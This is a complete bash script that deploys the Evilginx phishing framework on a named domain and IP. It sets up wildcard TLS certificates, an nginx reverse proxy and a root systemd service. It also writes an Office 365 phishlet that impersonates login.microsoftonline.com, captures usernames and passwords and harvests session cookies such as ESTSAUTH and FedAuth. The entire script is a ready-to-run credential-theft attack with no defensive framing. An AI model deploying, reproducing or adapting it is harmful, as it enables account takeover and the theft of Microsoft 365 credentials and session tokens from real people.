#!/bin/bash
set -euo pipefail

DOMAIN="hrahra.org"
SUBDOMAIN="securelogin.hrahra.org"
EXTERNAL_IP="134.199.198.228"
EVILGINX_DIR="/opt/posh-ai/evilginx3"
GO_VERSION="1.21.5"
NGINX_CONF="/etc/nginx/sites-available/evilginx"
NGINX_ENABLED="/etc/nginx/sites-enabled/evilginx"
SERVICE_FILE="/etc/systemd/system/evilginx3.service"

export DEBIAN_FRONTEND=noninteractive

apt update -qq
apt install -y wget curl git build-essential nginx certbot python3-certbot-nginx unzip jq

if ! command -v go &> /dev/null; then
    wget -q https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
    rm -rf /usr/local/go
    tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz
    echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile
    export PATH=$PATH:/usr/local/go/bin
    rm go${GO_VERSION}.linux-amd64.tar.gz
fi

mkdir -p /opt/posh-ai
cd /opt/posh-ai

if [ -d "evilginx3" ]; then
    rm -rf evilginx3
fi

git clone https://github.com/kgretzky/evilginx2.git evilginx3
cd evilginx3
/usr/local/go/bin/go build -o evilginx main.go

mkdir -p phishlets

cat > "$NGINX_CONF" <<EOF
server {
    listen 80;
    server_name $SUBDOMAIN;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $SUBDOMAIN;
    
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_ssl_verify off;
    }
}
EOF

ln -sf "$NGINX_CONF" "$NGINX_ENABLED"

systemctl stop nginx 2>/dev/null || true
certbot certonly --standalone --non-interactive --agree-tos --email admin@$DOMAIN -d $DOMAIN -d "*.$DOMAIN"

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Evilginx3 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$EVILGINX_DIR
ExecStart=$EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

echo "0 0,12 * * * /usr/bin/certbot renew --quiet" | crontab -

cat > $EVILGINX_DIR/config.json <<EOF
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "autocert": false,
    "bind_ipv4": "127.0.0.1",
    "dns_port": 53,
    "domain": "$DOMAIN",
    "external_ipv4": "$EXTERNAL_IP",
    "https_port": 8443,
    "ipv4": "$EXTERNAL_IP",
    "unauth_url": "https://www.microsoft.com"
  },
  "phishlets": {}
}
EOF

python3 << 'PYTHON_SCRIPT'
import yaml
import json

office365_phishlet = {
    'name': 'office365',
    'author': '@kgretzky',
    'min_ver': '3.0.0',
    'proxy_hosts': [
        {
            'phish_sub': 'securelogin',
            'orig_sub': 'login',
            'domain': 'microsoftonline.com',
            'session': True,
            'is_landing': True
        },
        {
            'phish_sub': 'securelogin',
            'orig_sub': 'www',
            'domain': 'office.com',
            'session': False,
            'is_landing': False
        }
    ],
    'sub_filters': [
        {
            'triggers_on': 'login.microsoftonline.com',
            'orig_sub': 'login',
            'domain': 'microsoftonline.com',
            'search': 'login.microsoftonline.com',
            'replace': 'securelogin.hrahra.org',
            'mimes': ['text/html', 'application/json', 'application/javascript', 'text/javascript']
        }
    ],
    'auth_tokens': [
        {
            'domain': '.microsoftonline.com',
            'keys': ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
        },
        {
            'domain': '.office.com',
            'keys': ['rtFa', 'FedAuth']
        }
    ],
    'auth_urls': [
        {
            'url': '/common/oauth2/authorize',
            'domain': 'login.microsoftonline.com'
        }
    ],
    'credentials': {
        'username': {
            'key': 'login',
            'search': '(.*)',
            'type': 'post'
        },
        'password': {
            'key': 'passwd',
            'search': '(.*)',
            'type': 'post'
        }
    },
    'login': {
        'domain': 'login.microsoftonline.com',
        'path': '/common/oauth2/authorize'
    },
    'force_post': [
        {
            'path': '/common/SAS/ProcessAuth',
            'search': 'login\\.microsoftonline\\.com',
            'replace': 'securelogin.hrahra.org',
            'type': 'body'
        }
    ]
}

with open('/opt/posh-ai/evilginx3/phishlets/office365.yaml', 'w') as f:
    yaml.dump(office365_phishlet, f, default_flow_style=False)
PYTHON_SCRIPT

systemctl daemon-reload
systemctl enable evilginx3
systemctl start nginx
systemctl start evilginx3

sleep 5

echo "config domain $DOMAIN" | $EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets
echo "config ipv4 external $EXTERNAL_IP" | $EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets
echo "phishlets hostname office365 $SUBDOMAIN" | $EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets
echo "phishlets enable office365" | $EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets

echo "Deployment complete. Evilginx3 running on $SUBDOMAIN"
echo "Service: systemctl status evilginx3"
echo "Logs: journalctl -u evilginx3 -f"
